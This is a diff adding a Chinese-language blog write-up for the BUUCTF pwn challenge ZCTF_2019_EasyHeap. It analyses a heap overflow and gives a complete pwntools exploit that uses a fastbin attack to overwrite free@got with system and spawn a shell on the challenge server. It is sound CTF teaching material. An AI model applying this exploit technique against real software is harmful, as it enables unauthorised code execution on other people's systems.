@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn ZCTF_2019_EasyHeap | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn ZCTF_2019_EasyHeap</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/05/09</h2>
+</div>
+
+<main>
+<h1 id="buuctf-pwn-zctf_2019_easyheap">BUUCTF Pwn ZCTF_2019_EasyHeap</h1>
+<p>考点：</p>
+<p>1、堆溢出</p>
+<p>2、fastbin attack</p>
+<p>3、House Of Spirit</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509185624980.png" alt="image-20200509185624980"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509185724239.png" alt="image-20200509185724239"></p>
+<p>常规的增、删、改，没有查看功能，但是程序中有个magic存在于bss段，输入4869满足if判断就执行l33t()，里面是system(&ldquo;cat /home/pwn/flag&quot;)</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509190222323.png" alt="image-20200509190222323"></p>
+<p>分析create_heap功能，定义了个heaparray[i]数组来存储创建的chunk指针</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509190151327.png" alt="image-20200509190151327"></p>
+<p>read_input()=&gt;read()</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509190448229.png" alt="image-20200509190448229"></p>
+<p>分析delete_heap功能，根据储存chunk指针的数组来free chunk，释放之后指针置为NULL不存在UAF漏洞</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509190657103.png" alt="image-20200509190657103"></p>
+<p>分析edit_heap功能，在edit中可以读入数据的大小由用户控制，存在堆溢出漏洞</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509191010959.png" alt="image-20200509191010959"></p>
+<p>所以解题思路就是利用堆溢出伪造fd指针，然后分配到bss段的magic处然后通过edit功能修改此处的值大于0x1305，然后运行程序输入4869就可以直接getflag，但是本题在BUUCTF上复现的，奈何BUUCTF上/home/pwn里没有flag，所以只能另辟蹊径getshell才能读flag</p>
+<p>这里我们知道的是chunk指针是储存在heaparray[]数组中的，并且delete功能和edit功能都是依据数组中储存的堆指针来操作的，所以可以利用edit的堆溢出覆盖已经free掉的chunk的fd指针为数组附近的合适地址来伪造chunk申请到数组附近的内存空间，然后利用edit功能修改heaparray数组中的chunk指针为free_got的地址，这样再利用edit功能就可以修改free_got为system地址了，最后再free的时候就相当于执行system，可以发现在delete功能中free的构造是free(heaparray[v1])，所以我们可以在chunk中写入&rdquo;/bin/sh\x00&quot;，这样执行free就是执行system(&quot;/bin/sh&rdquo;)</p>
+<p>具体的利用方式：</p>
+<p>1、add chunk0、chunk1</p>
+<p>2、free chunk 1</p>
+<p>3、edit chunk 0 堆溢出修改已经释放过的chunk1的fd指针为heaparray数组附近，为了绕过fastbin申请的大小要与链表中前一个堆的大小相同的验证，所以需要在heaparray之前找合适的数据来伪造chunk，常见的就是存在0x7f这样的数据的内存地址，完成之后fastbin-&gt;chunk1-&gt;faker chunk(heaparray附近)</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509215816742.png" alt="image-20200509215816742"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200509214154378.png" alt="image-20200509214154378"></p>
+<p>heaparray偏移0x33处的0x6020ad存在0x7f，通过glibc的验证计算后与我们申请的0x70是大小相同的，所以能够正确的申请到这一块内存空间</p>
+<p>4、然后add两个chunk，第二个chunk2就是heaparray附近了，然后通过edit chunk2来修改heaparray[0]-&gt;chunk0的指针为free_got，此时我们在edit chunk0就相当的可以修改free_got，修改为system_plt</p>
+<p>因为我们申请的0x6020ad出的空间，读入的数据的从0x6020bd开始覆盖的，所以覆盖到heaparray[0]，需要</p>
+<p>0x33-0x10=0x23=35字节</p>
+<p>5、但是我们还缺少字符串/bin/sh，仔细观察我们在add到faker chunk之前还要add回来之前已经释放的chunk1，所以可以在add回来chunk1的时候向里面写入&rdquo;/bin/sh\x00&quot;，最后free chunk1 就相当于执行system(&quot;/bin/sh&rdquo;)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+
+<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>R:
+	sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">29977</span>)
+<span style="color:#66d9ef">else</span>:
+	sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./easyheap</span><span style="color:#e6db74">&#39;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./easyheap</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size,content):
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice :</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Heap :</span><span style="color:#e6db74">&#39;</span>,str(size))
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">heap:</span><span style="color:#e6db74">&#39;</span>,content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx,size,content):
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice :</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Index :</span><span style="color:#e6db74">&#39;</span>,str(idx))
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Heap :</span><span style="color:#e6db74">&#39;</span>,str(size))
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">heap :</span><span style="color:#e6db74">&#39;</span>,content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice :</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
+	sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Index :</span><span style="color:#e6db74">&#39;</span>,str(idx))
+
+<span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#39;</span>:
+	add(<span style="color:#ae81ff">0x60</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">aaaaaaaaaa</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># 0</span>
+	add(<span style="color:#ae81ff">0x60</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bbbbbbbbbb</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># 1</span>
+	free(<span style="color:#ae81ff">1</span>)
+    <span style="color:#75715e">#堆溢出修改已经释放的chunk1的fd为0x6020ad</span>
+	edit(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x71</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x6020ad</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>))
+	<span style="color:#75715e">#gdb.attach(sh)</span>
+    <span style="color:#75715e">#在add回chunk1的时候写入/bin/sh</span>
+	add(<span style="color:#ae81ff">0x60</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># 1</span>
+	add(<span style="color:#ae81ff">0x60</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">c</span><span style="color:#e6db74">&#39;</span>)
+	<span style="color:#75715e">#gdb.attach(sh)</span>
+	edit(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">43</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">c</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">35</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">free</span><span style="color:#e6db74">&#39;</span>]))
+	<span style="color:#75715e">#gdb.attach(sh)</span>
+	edit(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">8</span>,p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]))
+	free(<span style="color:#ae81ff">1</span>)<span style="color:#75715e">#-&gt;system(&#34;/bin/sh&#34;)</span>
+	sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
+	sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>总结：</p>
+<p>1、我原本打算直接申请到free_got附近直接修改为system，但是好像行不通，必须要通过edit功能来修改，或许有其他的方法我不知道吧</p>
+<p>2、我也想在add chunk2的时候直接覆盖heaparray[0]为free_got但是无法getshell，必须要通过edit来覆盖才能getshell，尽管他们的内存布局都一样，想不明白</p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
